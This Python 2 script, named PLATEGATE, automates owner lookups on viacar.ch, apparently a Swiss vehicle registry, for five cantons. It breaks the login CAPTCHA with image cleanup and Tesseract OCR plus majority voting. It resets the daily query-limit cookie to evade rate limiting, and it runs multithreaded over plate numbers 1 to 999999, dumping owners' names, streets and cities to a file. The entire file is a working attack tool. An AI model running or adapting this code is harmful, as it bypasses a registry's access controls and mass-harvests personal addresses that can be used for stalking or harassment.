import re

from argparse import ArgumentParser
from bs4 import BeautifulSoup
from collections import Counter
from datetime import date
from itertools import groupby
from PIL import Image
from pytesseract import image_to_string
from requests import Session
from threading import Thread
from time import sleep, time
from Queue import Queue


class VehicleOwner:
    def __init__(self, table):
        self.type = table.find(string='Art:').parent.parent.next_sibling.next_sibling.contents[1].contents[0]
        self.name = table.find(string='Name:').parent.parent.parent.next_sibling.next_sibling.contents[0].contents[
            0].contents[1].contents[0]
        self.street = table.find(string='Strasse:').parent.parent.parent.next_sibling.next_sibling.contents[0].contents[
            1].contents[0]
        self.city = table.find(string='Ort:').parent.parent.parent.next_sibling.next_sibling.contents[0].contents[
            1].contents[0]

    def __repr__(self):
        return (self.type + '\n' + self.name + '\n' + self.street + '\n' + self.city + '\n').encode('utf8')


class Captcha:
    def __init__(self, raw_response):
        self.image = Image.open(raw_response)
        self.__preprocess_image()

    def __preprocess_image(self):
        self.image = self.image.convert('RGBA')
        self.pixel_data = self.image.load()

        # make pixels either black or white based on color threshold
        for y in xrange(self.image.size[1]):
            for x in xrange(self.image.size[0]):
                if self.pixel_data[x, y][0] < 90:
                    self.pixel_data[x, y] = (0, 0, 0, 255)
                else:
                    self.pixel_data[x, y] = (255, 255, 255, 255)

        # make black pixels of small objects white
        visited = []
        for y in xrange(self.image.size[1]):
            for x in xrange(self.image.size[0]):
                if (x, y) not in visited and self.pixel_data[x, y] == (0, 0, 0, 255):
                    cur_visit = self.__get_object_pixels((x, y))
                    visited.extend(cur_visit)
                    if len(cur_visit) < 40:
                        for pix in cur_visit:
                            self.pixel_data[pix[0], pix[1]] = (255, 255, 255, 255)

    def __get_object_pixels(self, first_pixel):
        i = 0
        already_visited = [first_pixel]
        while i < len(already_visited):
            self.__visit(already_visited, already_visited[i])
            i += 1
        return already_visited

    def __visit(self, already_visited, current_pixel):
        for y in xrange(max(0, current_pixel[1] - 1), min(self.image.size[1], current_pixel[1] + 2)):
            for x in xrange(max(0, current_pixel[0] - 1), min(self.image.size[0], current_pixel[0] + 2)):
                if (x, y) not in already_visited and self.pixel_data[x, y] == (0, 0, 0, 255):
                    already_visited.append((x, y))

    def solve(self):
        return image_to_string(self.image,
                               config='-psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 --user-patterns files/pattern.txt')

    def save(self, file_name):
        self.image.save(file_name)


class CaptchaOracle:
    @staticmethod
    def __is_valid_solution(possible_solution):
        return re.match(r'^[A-Z0-9]{5,8}$', possible_solution) is not None

    def __init__(self):
        self.possible_solutions = []

    def add_possible_solution(self, possible_solution):
        is_valid = CaptchaOracle.__is_valid_solution(possible_solution)
        if is_valid:
            self.possible_solutions.append(possible_solution)
        return is_valid

    def guess_solution(self):
        if len(self.possible_solutions) <= 1:
            return (None, None)
        if len(self.possible_solutions) == 2:
            return (self.possible_solutions[0], True) if self.possible_solutions[0] == self.possible_solutions[1] else (None, None)

        # determine most probable length of solution
        solutions_by_len = sorted([list(v) for k, v in groupby(sorted(self.possible_solutions, key=len), key=len)],
                                  key=len, reverse=True)
        if len(solutions_by_len) > 1 and len(solutions_by_len[0]) == len(solutions_by_len[1]):
            return (None, None)
        solutions_of_same_len = solutions_by_len[0]

        # for solutions of most probable length, determine most probable character for each position
        guessed_solution = ''
        for i in xrange(len(solutions_of_same_len[0])):
            letters_at_pos_i_with_frequency = sorted(
                Counter(reduce(lambda x, y: x + [y[i]], solutions_of_same_len, [])).items(),
                key=lambda x: x[1], reverse=True)
            if len(letters_at_pos_i_with_frequency) > 1 and letters_at_pos_i_with_frequency[0][1] == \
                    letters_at_pos_i_with_frequency[1][1]:
                return (None, None)
            guessed_solution += letters_at_pos_i_with_frequency[0][0]
        return (guessed_solution, guessed_solution == self.possible_solutions[0])


class PlateResolver:
    def __init__(self, canton, stat_queue):
        if canton not in ['AG', 'LU', 'SH', 'ZG', 'ZH']:
            raise ValueError('unsupported canton')
        self.__canton = canton
        self.__session = Session()
        self.__session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64, x64; Trident/7.0; rv:11.0) like Gecko'}
        self.__submit_page = None
        self.__result_page = None
        self.__stat_queue = stat_queue

    def __get_auth_token(self):
        return self.__session.cookies.get_dict().get('.AUTOINDEXAUTH')

    def __check_auth_token(self):
        if self.__get_auth_token() is None:
            raise RuntimeError('token expired')

    def __get_remaining_tries(self):
        tries_search = re.search(r'(\d+)/(\d+)$', self.__submit_page.find('span', id='LabelAnzahl').contents[0])
        return int(tries_search.group(2)) - int(tries_search.group(1))

    def __login(self):
        while self.__get_auth_token() is None:
            login_page = None
            solution = None
            is_first_solution = None
            while solution is None:
                response = self.__session.get('https://www.viacar.ch/eindex/Login.aspx?Kanton=' + self.__canton)
                login_page = BeautifulSoup(response.text, 'lxml')
                captcha_oracle = CaptchaOracle()
                start_time = int(time())
                while solution is None and int(time()) - start_time < 60:
                    response = self.__session.get(
                        'https://www.viacar.ch/eindex/' + login_page.find('img', id='SecBild').get('src'),
                        headers={'Referer': 'https://www.viacar.ch/eindex/Login.aspx?Kanton=' + self.__canton},
                        stream=True)
                    if response.status_code == 200:
                        recognized_text = Captcha(response.raw).solve()
                        if captcha_oracle.add_possible_solution(recognized_text):
                            (solution, is_first_solution) = captcha_oracle.guess_solution()
            sleep(3)
            response = self.__session.post('https://www.viacar.ch/eindex/Login.aspx?Kanton=' + self.__canton,
                                           data={
                                               '__VIEWSTATE': login_page.find('input', id='__VIEWSTATE').get('value'),
                                               '__VIEWSTATEGENERATOR': login_page.find('input',
                                                                                       id='__VIEWSTATEGENERATOR').get(
                                                   'value'),
                                               '__EVENTVALIDATION': login_page.find('input',
                                                                                    id='__EVENTVALIDATION').get(
                                                   'value'),
                                               login_page.find('input', type='text').get('id'): solution
                                           })
            if self.__get_auth_token() is not None:
                self.__stat_queue.put(1 if is_first_solution else 2)
                self.__submit_page = BeautifulSoup(response.text, 'lxml')
            else:
                self.__stat_queue.put(0)

    def __reset_remaining_tries(self):
        auth_token = self.__get_auth_token()
        self.__session.cookies.set('ViaInd' + self.__canton,
                                   'Anzahl=0&Date=' + date.today().strftime('%d.%m.%Y') + '&de-CH=de-CH',
                                   domain='www.viacar.ch', path='/')
        self.__session.get('https://www.viacar.ch/eindex/Login.aspx?Kanton=' + self.__canton)
        self.__session.cookies.set('.AUTOINDEXAUTH', auth_token, domain='www.viacar.ch', path='/')
        sleep(3)

    def __request_submit_page(self):
        if self.__get_remaining_tries() <= 1:
            self.__reset_remaining_tries()
        response = self.__session.post('https://www.viacar.ch/eindex/Result.aspx',
                                       data={
                                           '__VIEWSTATE': self.__result_page.find('input', id='__VIEWSTATE').get(
                                               'value'),
                                           '__VIEWSTATEGENERATOR': self.__result_page.find('input',
                                                                                           id='__VIEWSTATEGENERATOR').get(
                                               'value'),
                                           '__EVENTVALIDATION': self.__result_page.find('input',
                                                                                        id='__EVENTVALIDATION').get(
                                               'value')
                                       })
        self.__check_auth_token()
        self.__submit_page = BeautifulSoup(response.text, 'lxml')

    def __prepare_submit(self):
        self.__login() if self.__get_auth_token() is None else self.__request_submit_page()

    def __submit(self, plate):
        self.__session.post('https://www.viacar.ch/eindex/Search.aspx',
                            data={
                                '__VIEWSTATE': self.__submit_page.find('input', id='__VIEWSTATE').get('value'),
                                '__VIEWSTATEGENERATOR': self.__submit_page.find('input', id='__VIEWSTATEGENERATOR').get(
                                    'value'),
                                '__EVENTVALIDATION': self.__submit_page.find('input', id='__EVENTVALIDATION').get(
                                    'value'),
                                'TextBoxKontrollschild': plate
                            })
        self.__check_auth_token()
        response = self.__session.get('https://www.viacar.ch/eindex/Result.aspx')
        self.__check_auth_token()
        self.__result_page = BeautifulSoup(response.text, 'lxml')

    def __parse_result_page(self):
        if self.__result_page.find(string=re.compile('key was not present in the dictionary')) is not None:
            self.__submit_page = self.__result_page
            return None
        owners = []
        for owner in self.__result_page.find_all(bgcolor='whitesmoke'):
            owners.append(VehicleOwner(owner))
        return owners

    def get_vehicle_owner(self, plate):
        if plate < 1 or plate > 999999:
            raise ValueError('plate must be in range [1,999999]')
        while True:
            try:
                self.__prepare_submit()
                owners = None
                while owners is None:
                    self.__submit(plate)
                    owners = self.__parse_result_page()
                return owners
            except RuntimeError:
                self.__session.cookies.clear()


class PlateWorker(Thread):
    def __init__(self, canton, task_queue, result_queue, stat_queue):
        Thread.__init__(self)
        self.task_queue = task_queue
        self.result_queue = result_queue
        self.daemon = True
        self.canton = canton
        self.plate_resolver = PlateResolver(canton, stat_queue)
        self.start()

    def run(self):
        while True:
            plate = self.task_queue.get()
            result = None
            while result is None:
                try:
                    owners = self.plate_resolver.get_vehicle_owner(plate)
                    result = (plate, owners)
                except Exception as e:
                    print 'Exception while solving task {}\n'.format(e)
            print 'found {} vehicle owners for {}-{}\n'.format(len(result[1]), self.canton, result[0])
            self.result_queue.put(result)
            self.task_queue.task_done()


def parse_arguments():
    parser = ArgumentParser()
    parser.add_argument('canton', help='the canton of the plate', choices=['AG', 'LU', 'SH', 'ZG', 'ZH'])
    parser.add_argument('start', help='the plate number to start with', type=int)
    parser.add_argument('end', help='the last plate number to query', type=int, default=0, nargs='?')
    parser.add_argument('-t', '--threads', help='number of threads to use for querying', type=int, default=8)
    parser.add_argument('-o', '--outfile', help='file where the results are written', default='results.txt')
    args = parser.parse_args()
    if args.start < 1 or args.start > 999999:
        parser.error('start must be in range [1,999999]')
    if args.end < 0 or args.end > 999999:
        parser.error('end must be in range [1,999999]')
    if args.threads < 1:
        parser.error('number of threads must be > 0')
    if args.end != 0 and args.end < args.start:
        parser.error('start must be <= end')
    tasks = range(args.start, args.start + 1 if args.end == 0 else args.end + 1)
    return args.canton, tasks, min(args.threads, len(tasks)), args.outfile


def main():
    (canton, tasks, num_threads, outfile_path) = parse_arguments()
    print '        __-----------__\n      / _------------_ \\\n     / /              \\ \\\n     | |               | |\n     |_|_______________|_|\n /-\\|                     |/-\\\n| _ |\\         0         /| _ |\n|(_)| \\        !        / |(_)|\n|___|__\\_______!_______/__|___|\n[_________|PLATEGATE|_________] \n ||||     ~~~~~~~~~~~     ||||\n `--\'                     `--\''
    task_queue = Queue()
    for task in tasks:
        task_queue.put(task)
    result_queue = Queue()
    stat_queue = Queue()
    print 'grabbing vehicle owners for {}-{} {}with {} worker threads\n' \
        .format(canton, tasks[0], '' if len(tasks) == 1 else 'to {}-{} '.format(canton, tasks[-1]), num_threads)

    for _ in xrange(num_threads):
        PlateWorker(canton, task_queue, result_queue, stat_queue)
    task_queue.join()
    result_data = {}
    while not result_queue.empty():
        (plate, owners) = result_queue.get()
        result_data[plate] = owners

    if len(result_data) > 0:
        print '\n\n=== Summary ===\nqueried {}-{} {}\nfound {} vehicle owners\ndumped owner data to {}\n\n'.format(
            canton, tasks[0], '' if len(tasks) == 1 else 'to {}-{} '.format(canton, tasks[-1]),
            sum(map(len, result_data.values())), outfile_path)
        with open(outfile_path, 'w') as outfile:
            for plate in tasks:
                outfile.write('=== {}-{} ===\n'.format(canton, plate))
                for owner in result_data[plate]:
                    outfile.write('{}\n'.format(owner))
                outfile.write('\n')
    else:
        print 'sorry, no vehicle owners found\n'

    stats = []
    while not stat_queue.empty():
        stats.append(stat_queue.get())
    stats_result = {k:len(list(v)) for k,v in groupby(sorted(stats))}
    print 'stats raw data (size {}): {}\n\ngrouped: {}\n'.format(len(stats), stats, stats_result)


if __name__ == '__main__':
    main()
